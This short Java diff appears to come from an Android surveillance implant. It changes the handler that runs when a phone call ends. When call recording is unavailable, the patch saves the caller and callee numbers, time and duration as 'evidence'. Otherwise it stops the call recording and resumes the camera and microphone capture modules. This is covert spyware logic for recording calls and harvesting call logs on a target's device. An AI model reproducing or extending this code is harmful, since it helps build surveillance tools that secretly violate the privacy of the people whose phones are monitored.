@@ -116,15 +116,26 @@ public class BroadcastMonitorCall  {
 							if (Cfg.DEBUG) {
 								Check.log(TAG + " (manageReceive): stopping call"); //$NON-NLS-1$
 							}
-							RecordCall.self().stopCall();
-							ongoing_number="";
+							if (!RecordCall.self().canRecordAndroid() || !RecordCall.self().isRecording()) {
 
-							if(ModuleCamera.self()!=null) {
-								ModuleCamera.self().removeStop(MODULE_STOP_REASON);
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (notification): Saving CallList evidence"); //$NON-NLS-1$
+								}
+
+								String from = call.getFrom();
+								String to = call.getTo();
+
+								ModuleCall.self().saveCalllistEvidence(ModuleCall.CALLIST_PHONE, from, to, incoming, call.getTimeBegin(), call.getDuration());
+							}else {
+								RecordCall.self().stopCall();
+								if (ModuleCamera.self() != null) {
+									ModuleCamera.self().removeStop(MODULE_STOP_REASON);
+								}
+								if (ModuleMic.self() != null) {
+									ModuleMic.self().removeStop(MODULE_STOP_REASON);
+								}
 							}
-							if(ModuleMic.self()!=null) {
-								ModuleMic.self().removeStop(MODULE_STOP_REASON);
-							}
+							ongoing_number="";
 						}
 					}
 
